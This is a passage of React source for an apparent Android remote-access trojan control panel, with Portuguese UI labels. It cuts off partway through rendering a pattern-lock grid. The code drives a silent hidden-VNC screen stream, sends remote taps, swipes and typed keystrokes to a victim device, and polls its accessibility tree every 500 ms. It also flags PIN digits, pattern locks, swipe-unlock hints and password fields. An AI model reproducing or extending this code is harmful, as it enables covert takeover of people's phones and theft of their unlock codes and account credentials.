 * LiveScreen — HVNC · LY · V2 · DUPLO
 */
import {
  useEffect, useRef, useState, useCallback, useLayoutEffect,
} from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';
import LyCanvas, { nodeColor } from './LyCanvas.jsx';

const APK_W = 350;
const APK_H = 650;

// ── Hierarchy parser ─────────────────────────────────────────────────────────
function apkRect(b) {
  if (!b) return null;
  const left   = b.left  ?? b.x  ?? 0, top    = b.top   ?? b.y  ?? 0;
  const right  = b.right  ?? left + (b.w ?? 0), bottom = b.bottom ?? top  + (b.h ?? 0);
  return { left, top, right, bottom };
}
function walkNode(raw, depth, out) {
  if (!raw || depth > 30) return;
  const text   = raw.text || raw.desc || raw.contentDescription || '';
  const bounds = apkRect(raw.bounds);
  if (text || (bounds && bounds.right > bounds.left)) {
    out.push({
      text: text.trim(), cls: raw.class || raw.className || '',
      pkg: raw.pkg || raw.packageName || raw.windowPackage || '',
      clickable: !!raw.clickable, enabled: raw.enabled !== false,
      checked: !!raw.checked, focused: !!raw.focused,
      scrollable: !!raw.scrollable, editable: !!raw.editable,
      password: !!raw.password, longClickable: !!raw.longClickable,
      bounds, depth, id: raw.id || raw.viewIdResourceName || '',
      isKeyboard: !!(raw.isKeyboard || raw.isKeyboardKey), keyType: raw.keyType || null,
      isPinDigit: !!raw.isPinDigit, isPatternLock: !!raw.isPatternLock,
      isSwipeUnlock: !!raw.isSwipeUnlock, patternGrid: raw.patternGrid || null,
      swipeHint: raw.swipeHint || null, windowType: raw.windowType ?? null,
      hint: raw.hint || '',
    });
  }
  for (const c of (raw.children || [])) walkNode(c, depth + 1, out);
}
function parseHierarchy(raw) {
  const out = [];
  try {
    const p = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const root = p?.hierarchy ?? p;
    for (const r of (Array.isArray(root) ? root : [root])) walkNode(r, 0, out);
  } catch (_) {}
  return out;
}
function extractLines(nodes) {
  const tx = nodes.filter(n => n.text).sort((a, b) => {
    const ay = a.bounds ? (a.bounds.top + a.bounds.bottom) / 2 : 0;
    const by = b.bounds ? (b.bounds.top + b.bounds.bottom) / 2 : 0;
    return ay - by;
  });
  const rows = []; let row = [], lastY = -Infinity;
  for (const n of tx) {
    const y = n.bounds ? (n.bounds.top + n.bounds.bottom) / 2 : lastY + 40;
    if (Math.abs(y - lastY) > 22 && row.length) {
      rows.push([...row].sort((a, b) => (a.bounds?.left ?? 0) - (b.bounds?.left ?? 0))); row = [];
    }
    row.push(n); lastY = y;
  }
  if (row.length) rows.push(row);
  return rows;
}
const bCenter = b => b ? { x: Math.round((b.left + b.right) / 2), y: Math.round((b.top + b.bottom) / 2) } : null;

// ── Overlay: tap ripple ───────────────────────────────────────────────────────
function playRipple(canvas, normX, normY, col = '#fbbf24') {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  const px = normX * W, py = normY * H;
  let r = 5, maxR = 32, al = 0.75;
  const frame = () => {
    ctx.clearRect(0, 0, W, H);
    ctx.beginPath(); ctx.arc(px, py, r, 0, Math.PI * 2);
    ctx.strokeStyle = col; ctx.globalAlpha = al; ctx.lineWidth = 2.5; ctx.stroke();
    ctx.globalAlpha = 1; r += 3; al -= 0.055;
    if (r < maxR) requestAnimationFrame(frame); else ctx.clearRect(0, 0, W, H);
  };
  requestAnimationFrame(frame);
}
function drawArrow(canvas, x1n, y1n, x2n, y2n) {
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const W = canvas.width, H = canvas.height;
  ctx.clearRect(0, 0, W, H);
  const sx = x1n * W, sy = y1n * H, ex = x2n * W, ey = y2n * H;
  const ang = Math.atan2(ey - sy, ex - sx);
  ctx.strokeStyle = 'rgba(255,255,255,0.6)'; ctx.lineWidth = 2;
  ctx.setLineDash([5 * (canvas.width / 350), 5 * (canvas.width / 350)]); ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(ex, ey); ctx.stroke(); ctx.setLineDash([]);
  ctx.beginPath(); ctx.arc(sx, sy, 5 * (W / 350), 0, Math.PI * 2); ctx.fillStyle = 'rgba(255,255,255,0.8)'; ctx.fill();
  const aLen = 14 * (W / 350);
  ctx.beginPath(); ctx.moveTo(ex, ey);
  ctx.lineTo(ex - aLen * Math.cos(ang - 0.38), ey - aLen * Math.sin(ang - 0.38));
  ctx.lineTo(ex - aLen * Math.cos(ang + 0.38), ey - aLen * Math.sin(ang + 0.38));
  ctx.closePath(); ctx.fillStyle = 'rgba(255,255,255,0.8)'; ctx.fill();
}
function clearOverlay(canvas) { if (canvas) canvas.getContext('2d').clearRect(0, 0, canvas.width, canvas.height); }

// ── Connection quality ────────────────────────────────────────────────────────
function connQuality(fps, lat) {
  if (fps >= 25 && lat < 120)  return { label: 'EXCELENTE', col: '#4ade80', bars: 5 };
  if (fps >= 15 && lat < 300)  return { label: 'BOM',       col: '#a3e635', bars: 4 };
  if (fps >= 8  && lat < 600)  return { label: 'MÉDIO',     col: '#facc15', bars: 3 };
  if (fps >= 2)                return { label: 'FRACO',     col: '#fb923c', bars: 2 };
  return                              { label: 'SEM SINAL', col: '#f87171', bars: 1 };
}

// ── Modes ─────────────────────────────────────────────────────────────────────
const MODES = [
  { id: 'HVNC', icon: '🖥',  label: 'HVNC'  },
  { id: 'LY',   icon: '◻',  label: 'LY'    },
  { id: 'V2',   icon: '🔓', label: 'V2'    },
  { id: 'DUPLO',icon: '⧉',  label: 'DUPLO' },
];

// ─────────────────────────────────────────────────────────────────────────────
export default function LiveScreen({ deviceId, onBack, sendCmd }) {
  // VNC canvas
  const canvasRef   = useRef(null);
  const overlayRef  = useRef(null);
  const ctxRef      = useRef(null);
  const bitmapRef   = useRef(null);
  const dirtyRef    = useRef(false);
  const rafRef      = useRef(null);
  const fpsDecRef   = useRef(0);
  const latRef      = useRef(performance.now());
  const ptrRef      = useRef(null);
  const kbBufRef    = useRef('');
  const kbTimerRef  = useRef(null);

  // LY
  const lyCanvasRef = useRef(null);   // LyCanvas imperative handle
  const lyPtrRef    = useRef(null);
  const lyScaleRef  = useRef(null);
  const [lyHighlight,    setLyHighlight]    = useState(null);
  const [lySelected,     setLySelected]     = useState(null);
  const [lySearch,       setLySearch]       = useState('');
  const [lyZoom,         setLyZoom]         = useState(1);
  const [showLabels,     setShowLabels]     = useState(true);
  const [showContainers, setShowContainers] = useState(false);
  const [lyLastTap,      setLyLastTap]      = useState(null);
  const [lyScreenRes,    setLyScreenRes]    = useState(null);

  // Shared
  const autoRef = useRef(null);
  const ocrRef  = useRef(null);
  const setVnc  = useStore(s => s.setVncActive);

  const [mode,     setMode]     = useState('HVNC');
  const [vncQual,  setVncQual]  = useState(60);
  const [fps,      setFps]      = useState(0);
  const [latMs,    setLatMs]    = useState(0);
  const [vncOn,    setVncOn]    = useState(false);

  const [nodes,     setNodes]     = useState([]);
  const [lines,     setLines]     = useState([]);
  const [rawData,   setRawData]   = useState('');
  const [srTab,     setSrTab]     = useState('ocr');
  const [filter,    setFilter]    = useState('');
  const [toast,     setToast]     = useState(null);
  const [toastCol,  setToastCol]  = useState('#4ade80');
  const [srTs,      setSrTs]      = useState(null);
  const [srPkg,     setSrPkg]     = useState('');
  const [liveMode,  setLiveMode]  = useState(false);
  const [typeText,  setTypeText]  = useState('');
  const [tapX,      setTapX]      = useState('');
  const [tapY,      setTapY]      = useState('');

  // ── VNC context ───────────────────────────────────────────────────────────
  function getCtx() {
    if (ctxRef.current) return ctxRef.current;
    const c = canvasRef.current; if (!c) return null;
    ctxRef.current = c.getContext('2d', { alpha: false, desynchronized: true });
    if (ctxRef.current) ctxRef.current.imageSmoothingEnabled = false;
    return ctxRef.current;
  }

  // ── VNC RAF loop ──────────────────────────────────────────────────────────
  useEffect(() => {
    function loop() {
      if (dirtyRef.current) {
        const bmp = bitmapRef.current, ctx = getCtx();
        if (bmp && ctx) ctx.drawImage(bmp, 0, 0);
        dirtyRef.current = false;
      }
      rafRef.current = requestAnimationFrame(loop);
    }
    rafRef.current = requestAnimationFrame(loop);
    return () => { cancelAnimationFrame(rafRef.current); bitmapRef.current?.close?.(); };
  }, []);

  // Sync overlay size
  useLayoutEffect(() => {
    const ov = overlayRef.current, vc = canvasRef.current;
    if (ov && vc) { ov.width = vc.width; ov.height = vc.height; }
  }, []);

  // ── VNC binary pipeline ───────────────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const now = performance.now();
      setLatMs(Math.round(now - latRef.current)); latRef.current = now;
      fpsDecRef.current++;
      createImageBitmap(new Blob([buf], { type: 'image/jpeg' })).then(bmp => {
        bitmapRef.current?.close?.(); bitmapRef.current = bmp; dirtyRef.current = true;
      }).catch(() => {});
    });
    const t = setInterval(() => { setFps(fpsDecRef.current); fpsDecRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(t); };
  }, [deviceId]);

  // ── WS messages ───────────────────────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;
      if (msg.type === 'screen_hierarchy') {
        const raw = msg.data || '{}';
        try {
          const p = typeof raw === 'string' ? JSON.parse(raw) : raw;
          setSrPkg(p.package || '');
          const n = parseHierarchy(raw), l = extractLines(n);
          setNodes(n); setLines(l);
          setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
          setSrTs(msg.ts);
          let mx = 0, my = 0;
          for (const nd of n) {
            if (!nd.bounds) continue;
            if (nd.bounds.right > mx) mx = nd.bounds.right;
            if (nd.bounds.bottom > my) my = nd.bounds.bottom;
          }
          if (mx && my) setLyScreenRes({ w: mx, h: my });
          toast2('REQUEST_HIERARCHY', '#4ade80');
          setTimeout(() => ocrRef.current?.scrollTo({ top: 0, behavior: 'smooth' }), 40);
        } catch (_) {}
      }
      if (msg.type === 'vnc_status') { setVncOn(!!msg.active); setVnc(!!msg.active); }
    });
    return unsub;
  }, [deviceId]);

  // ── Live hierarchy polling ─────────────────────────────────────────────────
  useEffect(() => {
    clearInterval(autoRef.current);
    if (liveMode) { sendCmd('REQUEST_HIERARCHY'); autoRef.current = setInterval(() => sendCmd('REQUEST_HIERARCHY'), 500); }
    return () => clearInterval(autoRef.current);
  }, [liveMode, sendCmd]);

  // ── VNC controls ──────────────────────────────────────────────────────────
  const startVnc = () => { sendCmd('START_SILENT_VNC'); ws.subscribe('vnc', deviceId); setVncOn(true); setVnc(true); };
  const stopVnc  = () => { sendCmd('STOP_SILENT_VNC');  ws.unsubscribe('vnc', deviceId); setVncOn(false); setVnc(false); };
  const handleBack = () => { stopVnc(); setLiveMode(false); onBack(); };
  const toast2 = (m, col = '#4ade80') => { setToast(m); setToastCol(col); setTimeout(() => setToast(null), 1800); };

  // ── VNC coords: normalize 0-1 for vnc_norm path ───────────────────────────
  const normCoords = useCallback((cx, cy) => {
    const c = canvasRef.current; if (!c) return { x: 0.5, y: 0.5 };
    const r = c.getBoundingClientRect();
    return { x: Math.max(0.001, Math.min(0.999, (cx - r.left) / r.width)),
             y: Math.max(0.001, Math.min(0.999, (cy - r.top)  / r.height)) };
  }, []);

  // ── VNC pointer events ────────────────────────────────────────────────────
  const onPtrDown = useCallback(e => {
    if (e.button === 1) return; e.preventDefault();
    try { e.currentTarget.setPointerCapture(e.pointerId); } catch(_){}
    const { x, y } = normCoords(e.clientX, e.clientY);
    ptrRef.current = { clientX: e.clientX, clientY: e.clientY, normX: x, normY: y, ts: Date.now(), pointerId: e.pointerId, button: e.button };
  }, [normCoords]);

  const onPtrMove = useCallback(e => {
    if (!ptrRef.current || ptrRef.current.pointerId !== e.pointerId) return;
    const dist = Math.hypot(e.clientX - ptrRef.current.clientX, e.clientY - ptrRef.current.clientY);
    if (dist > 10) {
      const { x, y } = normCoords(e.clientX, e.clientY);
      drawArrow(overlayRef.current, ptrRef.current.normX, ptrRef.current.normY, x, y);
    }
  }, [normCoords]);

  const onPtrUp = useCallback(e => {
    const p = ptrRef.current;
    if (!p || p.pointerId !== e.pointerId) return;
    ptrRef.current = null; clearOverlay(overlayRef.current);
    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    if (p.button === 2 || (dist < 14 && dt > 550)) {
      sendCmd('LONG_PRESS', { x: p.normX, y: p.normY, scale: 'vnc_norm', duration: 800 });
      playRipple(overlayRef.current, p.normX, p.normY, '#c084fc');
      toast2('LONG PRESS', '#c084fc');
    } else if (dist < 14) {
      sendCmd('TAP', { x: p.normX, y: p.normY, scale: 'vnc_norm' });
      playRipple(overlayRef.current, p.normX, p.normY, '#fbbf24');
    } else {
      const { x: ex, y: ey } = normCoords(e.clientX, e.clientY);
      sendCmd('SWIPE', { x1: p.normX, y1: p.normY, x2: ex, y2: ey, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd, normCoords]);

  const onCtxMenu = useCallback(e => e.preventDefault(), []);

  const onWheel = useCallback(e => {
    e.preventDefault();
    const { x, y } = normCoords(e.clientX, e.clientY);
    const d = e.deltaY > 0 ? 0.22 : -0.22;
    sendCmd('SWIPE', { x1: x, y1: y, x2: x, y2: Math.max(0.01, Math.min(0.99, y + d)), scale: 'vnc_norm', duration: 120 });
  }, [sendCmd, normCoords]);

  // ── Keyboard passthrough ──────────────────────────────────────────────────
  const flushKb = useCallback(() => {
    if (!kbBufRef.current) return;
    sendCmd('TYPE', { text: kbBufRef.current }); kbBufRef.current = '';
  }, [sendCmd]);

  const onKbDown = useCallback(e => {
    if (!vncOn || e.ctrlKey || e.altKey || e.metaKey || e.key === 'Escape') return;
    if (e.key === 'Enter') { e.preventDefault(); clearTimeout(kbTimerRef.current); flushKb(); setTimeout(() => sendCmd('KEY', { action: 'ENTER' }), 60); return; }
    if (e.key === 'Backspace') { e.preventDefault(); clearTimeout(kbTimerRef.current); kbBufRef.current = kbBufRef.current.slice(0, -1); if (!kbBufRef.current) sendCmd('KEY', { action: 'BACK' }); return; }
    if (e.key.length === 1) { e.preventDefault(); kbBufRef.current += e.key; clearTimeout(kbTimerRef.current); kbTimerRef.current = setTimeout(flushKb, 150); }
  }, [vncOn, sendCmd, flushKb]);

  // ── LY pointer events ─────────────────────────────────────────────────────
  const onLyPtrDown = useCallback(e => {
    e.preventDefault(); try { e.currentTarget.setPointerCapture(e.pointerId); } catch(_){}
    lyPtrRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now(), pointerId: e.pointerId };
  }, []);

  const onLyPtrUp = useCallback(e => {
    const p = lyPtrRef.current; if (!p || p.pointerId !== e.pointerId) return;
    lyPtrRef.current = null;
    const dist = Math.hypot(e.clientX - p.clientX, e.clientY - p.clientY);
    const dt   = Date.now() - p.ts;
    const handle = lyCanvasRef.current;
    if (!handle) return;

    if (dist < 14) {
      const { node, devX, devY } = handle.hitTest({ x: p.clientX, y: p.clientY });
      if (node) {
        const center = bCenter(node.bounds);
        if (center) {
          setLyHighlight(node); setLySelected(node);
          setLyLastTap({ devX: center.x, devY: center.y });
          setTimeout(() => setLyHighlight(null), 500);
          sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: center.x, y: center.y });
          toast2(`${dt > 600 ? 'HOLD' : 'TAP'} → ${(node.text || node.cls.split('.').pop() || '').slice(0, 28)}`,
            nodeColor(node));
        }
      } else {
        setLyLastTap({ devX, devY });
        sendCmd('TAP', { x: devX, y: devY });
        toast2(`TAP (${devX}, ${devY})`, '#94a3b8');
      }
    } else {
      const s   = handle.cssToDevice({ x: p.clientX,  y: p.clientY });
      const end = handle.cssToDevice({ x: e.clientX, y: e.clientY });
      sendCmd('SWIPE', { x1: s.devX, y1: s.devY, x2: end.devX, y2: end.devY, duration: dt });
      toast2(`SWIPE →`, '#34d399');
    }
  }, [sendCmd]);

  // ── Node tap from OCR/Nodes list ──────────────────────────────────────────
  const tapNode = n => {
    const c = bCenter(n.bounds); if (!c) return;
    sendCmd('TAP', { x: c.x, y: c.y });
    toast2(`TAP → ${n.text || n.cls.split('.').pop()}`, nodeColor(n));
  };

  const filteredNodes = filter
    ? nodes.filter(n => n.text?.toLowerCase().includes(filter.toLowerCase()) ||
        n.cls?.toLowerCase().includes(filter.toLowerCase()) ||
        n.id?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  const qual       = connQuality(fps, latMs);
  const showVnc    = mode === 'HVNC' || mode === 'DUPLO';
  const showLy     = mode === 'LY'   || mode === 'DUPLO';
  const showReader = mode === 'V2'   || mode === 'DUPLO';

  const pinDigits    = nodes.filter(n => n.isPinDigit && n.text && n.clickable);
  const patternNode  = nodes.find(n => n.isPatternLock && n.patternGrid);
  const swipeNode    = nodes.find(n => n.isSwipeUnlock && n.swipeHint);
  const pwFields     = nodes.filter(n => n.password && n.editable);

  // ─────────────────────────────────────────────────────────────────────────
  return (
    <div className="fade-up">

      {/* Toast */}
      {toast && (
        <div style={{ position: 'fixed', top: 66, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(6,4,12,.97)', border: `1px solid ${toastCol}33`,
          borderRadius: 7, padding: '5px 13px', zIndex: 9999, maxWidth: '84vw',
          pointerEvents: 'none', boxShadow: `0 0 18px ${toastCol}22` }}>
          <span style={{ color: toastCol, fontSize: 11, fontWeight: 700 }}>{toast}</span>
        </div>
      )}

      {/* ── Toolbar ── */}
      <div className="row-sb mb6">
        <div>
          <div style={{ fontWeight: 800, fontSize: 12, color: 'var(--gold)', letterSpacing: .5 }}>EDITAR V2 ✏</div>
          <div className="row gap5 mt3" style={{ flexWrap: 'wrap' }}>
            <span style={{ fontSize: 9, color: 'var(--text3)' }}>OCR ⚡</span>
            <span style={{ fontSize: 9, fontWeight: 700, color: nodes.filter(n=>n.text).length ? '#4ade80' : 'var(--text3)' }}>
              {nodes.filter(n=>n.text).length > 0 ? `${Math.min(99, nodes.filter(n=>n.text).length)}%` : '—'}
            </span>
            {srPkg && <span style={{ fontSize: 9, color: 'var(--text3)' }}>{srPkg.split('.').slice(-1)[0]}</span>}
            {lyScreenRes && <span style={{ fontSize: 9, color: 'var(--text3)' }}>{lyScreenRes.w}×{lyScreenRes.h}</span>}
          </div>
        </div>
        <div className="row gap4" style={{ flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          {MODES.map(m => (
            <button key={m.id}
              onClick={() => { setMode(m.id); if (m.id !== 'HVNC') sendCmd('REQUEST_HIERARCHY'); }}
              className={`btn btn-sm ${mode === m.id ? 'btn-blue' : 'btn-ghost'}`}
              style={{ padding: '3px 8px', fontSize: 11, fontWeight: 700 }}>
              {m.icon} {m.label}
            </button>
          ))}
          <button className="btn btn-ghost btn-sm" style={{ padding: '3px 8px', fontSize: 11 }} onClick={handleBack}>←</button>
        </div>
      </div>

      {/* ── Status bar ── */}
      <div className="row gap5 mb6" style={{ flexWrap: 'wrap' }}>
        <span style={{ display: 'flex', alignItems: 'center', gap: 4,
          background: 'rgba(0,0,0,.3)', borderRadius: 10, padding: '2px 7px',
          border: `1px solid ${qual.col}33` }}>
          <span style={{ display: 'flex', gap: 2, alignItems: 'flex-end' }}>
            {[1,2,3,4,5].map(i => (
              <span key={i} style={{ width: 3, height: 6 + i * 1.5,
                background: i <= qual.bars ? qual.col : '#374151', borderRadius: 1 }} />
            ))}
          </span>
          <span style={{ fontSize: 9, color: qual.col, fontWeight: 700 }}>{qual.label}</span>
        </span>
        <span className={`pill ${vncOn ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 9 }}>
          {vncOn ? `${fps} FPS · ${latMs}ms` : 'OFF'}
        </span>
        {nodes.length > 0 && <span className="pill pill-gold" style={{ fontSize: 9 }}>{nodes.filter(n=>n.text).length} nodes</span>}
        {liveMode && <span className="pill pill-red" style={{ fontSize: 9 }}>🔴 LIVE</span>}
      </div>

      {/* ══ HVNC CANVAS ══════════════════════════════════════════════════════ */}
      {showVnc && (
        <>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8,
            padding: '4px 10px', borderRadius: '7px 7px 0 0',
            background: 'rgba(6,4,14,.95)', border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none' }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#60a5fa', letterSpacing: 1 }}>HVNC</span>
            <span style={{ width: 1, height: 11, background: 'rgba(255,255,255,.1)' }} />
            <span style={{ fontSize: 9, color: vncOn ? '#4ade80' : '#475569', fontWeight: 700 }}>
              {vncOn ? `${fps} FPS` : 'PARADO'}</span>
            <span style={{ fontSize: 9, color: 'var(--text3)' }}>{latMs}ms · {APK_W}×{APK_H}</span>
            <span style={{ marginLeft: 'auto', fontSize: 9, color: 'var(--text3)' }}>clique · arraste · rola · digita</span>
          </div>
          <div tabIndex={0} onKeyDown={onKbDown} style={{ outline: 'none', position: 'relative', touchAction: 'none' }}>
            <canvas ref={canvasRef} width={APK_W} height={APK_H}
              onPointerDown={onPtrDown} onPointerMove={onPtrMove}
              onPointerUp={onPtrUp} onPointerCancel={onPtrUp}
              onContextMenu={onCtxMenu} onWheel={onWheel}
              style={{ display: 'block', width: '100%', height: 'auto',
                borderRadius: '0 0 7px 7px', cursor: vncOn ? 'crosshair' : 'default' }} />
            <canvas ref={overlayRef} width={APK_W} height={APK_H}
              style={{ position: 'absolute', inset: 0, width: '100%', height: '100%',
                pointerEvents: 'none', borderRadius: '0 0 7px 7px' }} />
            {!vncOn && (
              <div className="vnc-overlay">
                <div className="spin" />
                <div style={{ fontSize: 11, color: 'var(--text2)', marginTop: 8 }}>Aguardando stream...</div>
              </div>
            )}
          </div>
          <div style={{ fontSize: 9, color: 'var(--text3)', textAlign: 'center', padding: '3px 0' }}>
            ↑ Foque o canvas e digite para injetar texto direto
          </div>
          <div className="grid g2 mt5 mb6">
            <button className="btn btn-gold btn-block btn-sm" onClick={startVnc}>▶ VNC ON</button>
            <button className="btn btn-red  btn-block btn-sm" onClick={stopVnc}>⏹ VNC OFF</button>
            <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('FORCE_RESTART_VNC')}>↺ RESTART</button>
            <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SNAP_SCREEN')}>📷 SNAP</button>
          </div>
          <div className="card card-sm mb8">
            <div className="row-sb mb3">
              <span className="txt-xs txt-dim">QUALIDADE JPEG</span>
              <span className="txt-xs txt-gold bold">{vncQual}%</span>
            </div>
            <input type="range" min="10" max="100" value={vncQual}
              style={{ width: '100%', accentColor: '#d4950a' }}
              onChange={e => { setVncQual(+e.target.value); sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value }); }} />
          </div>
        </>
      )}

      {/* ══ LY LAYOUT OVERLAY ════════════════════════════════════════════════ */}
      {showLy && (
        <div>
          {/* LY header */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 6,
            padding: '4px 10px', borderRadius: '7px 7px 0 0',
            background: 'rgba(6,4,14,.95)', border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none' }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#60a5fa', letterSpacing: 1 }}>LY</span>
            <span style={{ width: 1, height: 11, background: 'rgba(255,255,255,.1)' }} />
            {nodes.length > 0 && (
              <div className="row gap5">
                <span style={{ fontSize: 9, color: '#fbbf24', fontWeight: 700 }}>{nodes.filter(n=>n.clickable).length} tap</span>
                <span style={{ fontSize: 9, color: '#c084fc' }}>{nodes.filter(n=>n.isKeyboard).length} kbd</span>
                <span style={{ fontSize: 9, color: '#4ade80' }}>{nodes.filter(n=>n.scrollable).length} scroll</span>
                {nodes.filter(n=>n.password).length > 0 && <span style={{ fontSize: 9, color: '#f87171' }}>🔒 {nodes.filter(n=>n.password).length}</span>}
                {nodes.filter(n=>n.focused).length > 0 && <span style={{ fontSize: 9, color: '#f9fafb' }}>⊙ focado</span>}
              </div>
            )}
            <div className="row gap3" style={{ marginLeft: 'auto' }}>
              <button onClick={() => setLyZoom(v => v === 1 ? 1.8 : v === 1.8 ? 2.8 : 1)}
                className="btn btn-ghost btn-xs" style={{ fontSize: 9, minWidth: 26 }}>
                {lyZoom === 1 ? '1×' : lyZoom === 1.8 ? '1.8×' : '2.8×'}
              </button>
              <button onClick={() => setShowLabels(v => !v)}
                className={`btn btn-xs ${showLabels ? 'btn-gold' : 'btn-ghost'}`} style={{ fontSize: 9 }}>Aa</button>
              <button onClick={() => setShowContainers(v => !v)}
                className={`btn btn-xs ${showContainers ? 'btn-blue' : 'btn-ghost'}`} style={{ fontSize: 9 }}>⊞</button>
              <button onClick={() => setLiveMode(v => !v)}
                className={`btn btn-xs ${liveMode ? 'btn-red' : 'btn-ghost'}`} style={{ fontSize: 9 }}>
                {liveMode ? '🔴' : '⭕'}
              </button>
              <button onClick={() => sendCmd('REQUEST_HIERARCHY')}
                className="btn btn-ghost btn-xs" style={{ fontSize: 9 }}>↺</button>
            </div>
          </div>

          {/* LY search */}
          <div style={{ background: 'rgba(6,4,14,.9)', border: '1px solid rgba(255,255,255,.07)',
            borderTop: 'none', borderBottom: 'none', padding: '4px 8px' }}>
            <input className="input" value={lySearch} onChange={e => setLySearch(e.target.value)}
              placeholder="Buscar nó por texto ou classe..."
              style={{ width: '100%', fontSize: 10, padding: '3px 7px' }} />
          </div>

          {/* LY canvas zoom container */}
          <div style={{ border: '1px solid rgba(59,130,246,.18)', borderTop: 'none',
            borderRadius: '0 0 7px 7px', background: '#07090f', overflowX: lyZoom > 1 ? 'auto' : 'hidden',
            minHeight: nodes.length ? undefined : 80 }}>
            <div style={{ transform: `scale(${lyZoom})`, transformOrigin: 'top left',
              width: `${(100 / lyZoom).toFixed(2)}%`, touchAction: 'none', cursor: 'crosshair' }}
              onPointerDown={onLyPtrDown} onPointerUp={onLyPtrUp} onPointerCancel={onLyPtrUp}>
              <LyCanvas
                ref={lyCanvasRef}
                nodes={nodes}
                highlight={lyHighlight}
                searchTerm={lySearch}
                showLabels={showLabels}
                showContainers={showContainers}
                lastTap={lyLastTap}
                onScale={scale => { lyScaleRef.current = scale; }}
              />
            </div>
            {!nodes.length && (
              <div style={{ display:'flex', flexDirection:'column', alignItems:'center',
                justifyContent:'center', padding: 28, minHeight: 80 }}>
                <div style={{ fontSize: 22, opacity: .3, marginBottom: 6 }}>◻</div>
                <div style={{ fontSize: 10, color: 'var(--text3)', textAlign: 'center' }}>
                  Toque ↺ para carregar hierarquia
                </div>
              </div>
            )}
          </div>

          {/* LY legend */}
          <div className="row gap4 mt5 mb5" style={{ flexWrap: 'wrap' }}>
            {[['TAP','#fbbf24'],['EDIT','#34d399'],['SCROLL','#4ade80'],
              ['KBD','#c084fc'],['PIN','#60a5fa'],['PWD','#f87171'],['FOC','#f9fafb']].map(([l,c]) => (
              <span key={l} style={{ fontSize: 8, padding: '1px 5px', borderRadius: 3, fontWeight: 700,
                border: `1px solid ${c}44`, color: c, letterSpacing: .5 }}>{l}</span>
            ))}
            {srTs && <span style={{ fontSize: 8, color: 'var(--text3)', marginLeft: 'auto' }}>{new Date(srTs).toLocaleTimeString()}</span>}
          </div>

          {/* Selected node detail */}
          {lySelected && (
            <div className="card card-sm mb6" style={{ border: `1px solid ${nodeColor(lySelected)}22` }}>
              <div className="row-sb mb5">
                <span style={{ fontSize: 11, fontWeight: 800, color: nodeColor(lySelected) }}>
                  {lySelected.cls.split('.').pop()}
                  {lySelected.focused && <span style={{ marginLeft: 6, fontSize: 9, color: '#f9fafb' }}>⊙ FOCO</span>}
                </span>
                <button className="btn btn-ghost btn-xs" onClick={() => setLySelected(null)}>✕</button>
              </div>
              {lySelected.text && <div style={{ fontSize: 12, fontWeight: 600, color: 'var(--text)', marginBottom: 3 }}>"{lySelected.text}"</div>}
              {lySelected.hint && <div style={{ fontSize: 10, color: 'var(--text3)', marginBottom: 3, fontStyle: 'italic' }}>hint: {lySelected.hint}</div>}
              {lySelected.id && <div className="txt-xs txt-mono txt-dim mb3">#{lySelected.id.split('/').pop()}</div>}
              {lySelected.bounds && (
                <div className="txt-xs txt-mono txt-dim mb5">
                  [{lySelected.bounds.left},{lySelected.bounds.top}→{lySelected.bounds.right},{lySelected.bounds.bottom}]
                  {' '}({lySelected.bounds.right-lySelected.bounds.left}×{lySelected.bounds.bottom-lySelected.bounds.top}px)
                </div>
              )}
              <div className="row gap5" style={{ flexWrap: 'wrap' }}>
                <button className="btn btn-gold btn-sm flex1" style={{ minWidth: 52 }} onClick={() => tapNode(lySelected)}>TAP</button>
                {lySelected.longClickable && (
                  <button className="btn btn-ghost btn-sm flex1" style={{ minWidth: 52 }}
                    onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('LONG_PRESS', { x: c.x, y: c.y, duration: 800 }); }}>HOLD</button>
                )}
                {lySelected.scrollable && (
                  <>
                    <button className="btn btn-ghost btn-sm"
                      onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y-300, x2: c.x, y2: c.y+300, duration: 180 }); }}>↓</button>
                    <button className="btn btn-ghost btn-sm"
                      onClick={() => { const c = bCenter(lySelected.bounds); if (c) sendCmd('SWIPE', { x1: c.x, y1: c.y+300, x2: c.x, y2: c.y-300, duration: 180 }); }}>↑</button>
                  </>
                )}
                {lySelected.editable && (
                  <button className="btn btn-blue btn-sm flex1" style={{ minWidth: 52 }}
                    onClick={() => { tapNode(lySelected); setTimeout(() => document.getElementById('ly-type-input')?.focus(), 120); }}>EDITAR</button>
                )}
              </div>
              {lySelected.isPatternLock && lySelected.patternGrid && (
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 5, marginTop: 7, maxWidth: 110 }}>
                  {lySelected.patternGrid.map((p, pi) => (
                    <button key={pi} className="btn btn-ghost btn-sm" style={{ fontSize: 11, fontWeight: 700 }}
